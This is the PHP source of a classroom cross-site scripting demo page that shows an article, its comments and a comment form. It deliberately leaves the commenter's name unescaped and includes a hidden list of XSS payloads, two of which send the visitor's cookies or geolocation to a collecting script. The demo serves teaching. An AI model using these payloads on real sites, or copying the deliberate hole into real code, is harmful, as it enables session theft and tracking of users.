<?php
  require 'db_connect.php';
  
  if (!isset($_GET['id']) || !ctype_digit($_GET['id']))
  { // If there is no "id" URL data or it isn't a number
    $thread = false;
  }
  else
  {  
    // Select details of specified article
    // Since the user could tamper with the URL data, a prepared statement is used
    $stmt = $db->prepare("SELECT * FROM xss_article WHERE article_id = ?");
    $stmt->execute( [$_GET['id']] );
    $article = $stmt->fetch();
  }
  
  if (!$article)
  { // If no data (no article with that ID in the database)
    echo '<p>Invalid article ID.</p>';
    exit;  
  }
?>
<!DOCTYPE html>
<html>
  <head>
  <title>XSS Example - <?= $article['title'] ?></title>
  <meta name="author" content="Greg Baatard" />
  <meta name="description" content="View article page for XSS example" />
  <link rel="stylesheet" type="text/css" href="../../example_stylesheet.css" />
  <style> pre {font-family: monospace; padding-bottom: 15px; border-bottom: 1px solid grey; width: 95ch;} </style>
  <script nonce="<?= $nonce ?>">
    // The "nonce" attribute in the script tag refers to a random value generated each time the page is requested
    // The value must match the one generated in db_connect.php to allow a <script> tag to run
    
    function toggleXSSBox()
    {
      if (document.getElementById('xss').style.display == 'none' )
      {
        document.getElementById('xss').style.display = 'block';
      }
      else
      {
        document.getElementById('xss').style.display = 'none';
      }      
    }
    
    // This attaches the toggleXSSBox function to "XSS Suggestions" text in a way that doesn't use an "onclick" event
    // (to avoid clashing with the Content-Security-Policy)
    window.onload = function () {document.getElementById('box_header').addEventListener('click', toggleXSSBox)}
  </script>
  </head>
  <body>
    <h3>View Article (Protected Version)</h3>
    <a href="index.php">Back to Article List</a> | <a href="delete_comments.php?id=<?= $_GET['id'] ?>">Delete All Comments on this Article</a>
    <br /><br />
    <?php
      echo '<h2>'.$article['title'].'</h2>';
      echo '<p><small><em>Posted on '.$article['post_date'].'</em></small></p>';
      echo '<p>'.$article['content'].'</p><br />';


      echo '<h3>Comments</h3>';
      
      // Select comments of specified article
      $stmt = $db->prepare("SELECT * FROM xss_comment WHERE article_id = ? ORDER BY post_date");
      $stmt->execute( [$_GET['id']] );
      $comment_data = $stmt->fetchAll();
      
      if (count($comment_data))
      { // Loop through results to display comments
        foreach ($comment_data as $row)
        {
          // Use the "htmlentities()" function to encode/escape special characters
          // I've deliberately *not* used the function when displaying the commenter's name, to demonstrate the other security measures
          $name = $row['name'] != '' ? $row['name'] : 'Anonymous';
          echo '<p style="width: 400px; border: 1px solid grey; margin: 5px; padding: 5px"><small><strong>'.$name.'</strong> says: <em>'.htmlentities($row['content'], ENT_QUOTES).'</em></small></p>';
        }
      }
      else
      { // If no data (no comments on that article yet)
        echo '<p>No comments - be the first to comment!</p>';
      }
    ?>
    <br />
    <h3>New Comment</h3>
    <form name="new_comment" method="post" action="post_comment.php">
      
      <input type="hidden" name="article_id" value="<?= $_GET['id'] ?>" />

      <p><strong>Name:</strong><br />
        <input type="text" name="name" style="width: 398px;" />
      </p>

      <p><strong>Comment:</strong><br />
        <textarea name="content" style="width: 400px; height: 100px"></textarea>
      </p>

      <p>
        <input type="submit" name="submit" value="Submit" />
      </p>
      
      <p style="cursor: pointer;" id="box_header"><strong>XSS Suggestions</strong> (click to reveal)</p>
      <div id="xss" style="display: none;">
      
<pre>
&lt;script&gt;alert('Cats rule, dogs drool!');&lt;/script&gt;
</pre>
<pre>
&lt;img src="#" style="display: none;" onerror="alert(document.cookie);" /&gt;
</pre>
<pre>
&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiT29mLiIpOzwvc2NyaXB0Pg=="&gt;&lt;/object&gt;
</pre>
<pre>
&lt;script&gt;
  xhr = new XMLHttpRequest();
  xhr.open("GET", "receive_data.php?data="+document.cookie);
  xhr.send();
&lt;/script&gt;
</pre>
<pre>
&lt;script&gt;
  function sendLocation(pos)
  {
    fetch("receive_data.php?data="+pos.coords.latitude+", "+pos.coords.longitude);
  }
  navigator.geolocation.getCurrentPosition(sendLocation);
&lt;/script&gt;
</pre>
        
      </div>


    </form>
  </body>
</html>